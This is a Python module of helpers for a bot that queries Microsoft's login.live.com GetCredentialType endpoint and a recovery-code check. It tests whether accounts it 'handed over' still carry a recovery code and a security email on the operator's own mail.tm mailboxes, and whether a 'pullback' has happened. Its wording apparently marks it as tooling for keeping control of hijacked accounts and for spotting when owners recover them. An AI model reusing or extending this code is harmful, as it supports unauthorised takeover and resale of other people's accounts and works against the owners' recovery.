"""Read-only account-integrity helpers.

Everything here answers "is this account still ours?" without ever changing it:

  • ``fetch_credential_type`` — GetCredentialType probe (read-only; never sends
    an OTP or a password).
  • ``check_security_email_intact`` — is our security-email proof still listed?
  • ``check_pullback_intact`` — recovery code still valid? If not, is the
    security email still there? (``ok`` / ``partial`` / ``bad`` / ``unknown``)

Used by the securing flow to confirm an account's proofs before/after a change.
"""

from __future__ import annotations

import logging

from mail import settings as mail_settings

logger = logging.getLogger("bot")


def _our_domains() -> set[str]:
    """Every mail.tm domain we provisioned mailboxes on."""
    domains = set(mail_settings.readable_domains())
    return {d for d in domains if d}


def _proof_matches_expected(proof: dict, expected: str) -> bool:
    """Match full or masked MS proof display to our stored security email."""
    expected = (expected or "").strip().lower().replace(r"\u0040", "@")
    if not expected or "@" not in expected:
        return False
    local, _, domain = expected.partition("@")
    display = (
        str(proof.get("display") or proof.get("displayProofName") or "")
        .lower()
        .replace(r"\u0040", "@")
    )
    clear = str(proof.get("clearDigits") or "").lower()

    if display == expected:
        return True
    if "@" not in display:
        return bool(clear) and local.startswith(clear) and domain in display

    d_local, _, d_domain = display.partition("@")
    if d_domain != domain:
        return False
    if "*" in d_local:
        prefix = d_local.split("*", 1)[0]
        if prefix and local.startswith(prefix):
            return True
        if clear and local.startswith(clear):
            return True
        return False
    return d_local == local


def _any_domain_proof(proofs: list, domains) -> bool:
    """True when any proof sits on a mailbox domain we can read."""
    if isinstance(domains, str):
        wanted = {domains.lower().lstrip("@")}
    else:
        wanted = {str(d).lower().lstrip("@") for d in (domains or []) if d}
    if not wanted:
        return False

    for proof in proofs:
        if not isinstance(proof, dict):
            continue
        display = (
            str(proof.get("display") or "")
            .lower()
            .replace(r"\u0040", "@")
        )
        if "@" not in display:
            continue
        if display.rsplit("@", 1)[1] in wanted:
            return True
    return False


async def fetch_credential_type(email: str) -> dict | None:
    """Read-only GetCredentialType — never sends an OTP or password.

    Needs a fresh PPFT/flowToken from login.live.com (empty token often omits Credentials).
    """
    try:
        from securing.auth.initial_session import get_session
        from securing.utils.cookies.get_livedata import livedata
        from securing.utils.proxy import close_session
    except Exception:
        get_session = livedata = close_session = None  # type: ignore

    session = None
    try:
        if get_session is None or livedata is None:
            raise RuntimeError("session helpers unavailable")
        session = get_session()
        live = await livedata(session)
        flow = live.get("ppft") or live.get("sFT") or ""
        resp = await session.post(
            url="https://login.live.com/GetCredentialType.srf",
            headers={
                "Accept": "application/json",
                "Content-Type": "application/json; charset=utf-8",
                "Referer": "https://login.live.com/",
            },
            json={
                "checkPhones": True,
                "country": "",
                "federationFlags": 3,
                "flowToken": flow,
                "forceotclogin": False,
                "isCookieBannerShown": True,
                "isExternalFederationDisallowed": True,
                "isFederationDisabled": True,
                "isFidoSupported": False,
                "isOtherIdpSupported": False,
                "isReactLoginRequest": True,
                "isRemoteConnectSupported": False,
                "isRemoteNGCSupported": True,
                "isSignup": False,
                "otclogindisallowed": False,
                "username": email,
            },
        )
        body = resp.text or ""
        if not body.strip():
            logger.warning(
                "GetCredentialType empty for %s status=%s", email, resp.status_code
            )
            return None
        try:
            return resp.json()
        except Exception:
            logger.warning(
                "GetCredentialType non-JSON for %s status=%s snippet=%r",
                email,
                resp.status_code,
                body[:200],
            )
            return None
    except Exception as exc:
        logger.warning(
            "GetCredentialType failed for %s: %s",
            email,
            exc.__class__.__name__,
        )
        return None
    finally:
        if session is not None and close_session is not None:
            try:
                await close_session(session)
            except Exception:
                pass


def _usable_recovery_code(value: str | None) -> str | None:
    rc = (value or "").strip().upper().replace(" ", "")
    if not rc or rc in ("INVALID", "COULDN'T CHANGE!", "COULDNT CHANGE!", "N/A", "UNKNOWN"):
        return None
    # MS recovery codes are 5x5 groups; allow bare 25-char too
    compact = rc.replace("-", "")
    if len(compact) < 20:
        return None
    return rc


async def check_pullback_intact(
    email: str,
    *,
    recovery_code: str | None = None,
    expected_security_email: str | None = None,
    domain: str | None = None,
) -> tuple[str, str | None]:
    """Return (ok|partial|bad|unknown, reason) for an account we handed over.

    Verified without ever logging in as the account:
      1) Read-only VerifyRecoveryCode with the stored post-secure recovery code
      2) If the recovery code is invalid or missing -> security-email proof check
      3) Never RecoverUser / SubmitRecovery / password login

    Status meaning:
      ok       — recovery code still valid
      partial  — recovery code invalid/missing but security email still present
      bad      — recovery code invalid/missing AND security email gone/replaced
      unknown  — inconclusive (retry later; treat as unchanged)
    """
    rc = _usable_recovery_code(recovery_code)
    rc_bad_reason: str | None = None

    if rc:
        try:
            from securing.utils.security.recovery import check_recovery_code_valid
        except Exception:
            return "unknown", "recovery check helper unavailable"
        status, reason = await check_recovery_code_valid(email, rc)
        if status == "ok":
            return "ok", None
        if status == "unknown":
            return "unknown", reason or "Recovery code check inconclusive"
        # KnowMe / HTML "does not exist" is often a false positive (proxy flake).
        # Do not judge from that alone — retry later. Real pullbacks use
        # "Invalid or already-used recovery code" + missing security email.
        reason_l = (reason or "").lower()
        if "does not exist" in reason_l or (
            "not recognized" in reason_l and "already-used" not in reason_l
        ):
            return "unknown", reason or "Account-status probe inconclusive"
        rc_bad_reason = reason or "Stored recovery code no longer valid"
    else:
        rc_bad_reason = "No usable recovery code stored"

    email_status, email_reason = await check_security_email_intact(
        email,
        expected_security_email,
        domain=domain,
    )

    if email_status == "ok":
        return (
            "partial",
            (
                f"RC invalid ({rc_bad_reason}); security email still present"
                if rc
                else "No recovery code; security email still present"
            ),
        )

    if email_status == "unknown":
        return "unknown", email_reason or "Security email check inconclusive"

    return (
        "bad",
        (
            f"RC invalid ({rc_bad_reason}); security email also missing/replaced "
            f"({email_reason})"
        ),
    )


async def check_security_email_intact(
    email: str,
    expected_security_email: str | None,
    *,
    domain: str | None = None,
) -> tuple[str, str | None]:
    """Return (ok|bad|unknown, reason).

    Confirms an account still lists our security email on GetCredentialType
    (masked proofs supported). No password login / no OTP.
    Used when the recovery code is invalid or not stored.
    """
    email = (email or "").strip()
    if not email:
        return "unknown", "Missing email for security-email check"

    domains = _our_domains()
    if domain:
        domains.add(str(domain).lower().lstrip("@"))
    hint = ", ".join(sorted(domains))
    expected = (expected_security_email or "").strip()
    if expected in ("Couldn't Change!", "Unknown", "N/A"):
        expected = ""

    info = await fetch_credential_type(email)
    if not info:
        return "unknown", "GetCredentialType inconclusive"

    # 0 = Exists, 1 = Not exist (common MS values)
    if_exists = info.get("IfExistsResult")
    if if_exists in (1, "1"):
        return "bad", "Account email no longer exists at Microsoft"

    creds = info.get("Credentials")
    if not isinstance(creds, dict):
        return "unknown", "GetCredentialType missing Credentials"

    proofs = creds.get("OtcLoginEligibleProofs") or []
    if not isinstance(proofs, list):
        proofs = []

    if expected:
        for proof in proofs:
            if isinstance(proof, dict) and _proof_matches_expected(proof, expected):
                return "ok", None
        # Expected proof gone — security email removed
        if proofs:
            shown = [
                str(p.get("display") or "?")
                for p in proofs
                if isinstance(p, dict)
            ][:5]
            return (
                "bad",
                f"Security email removed or replaced (expected {expected}; saw {shown})",
            )
        return "bad", f"Security email proof missing (expected {expected})"

    # No stored expected — at least require one of our inbox domains still there
    if _any_domain_proof(proofs, domains):
        return "ok", None
    if proofs:
        return "bad", f"No security email on our inbox domains ({hint}) anymore"
    return "bad", f"No email OTP proofs left (expected one of {hint})"
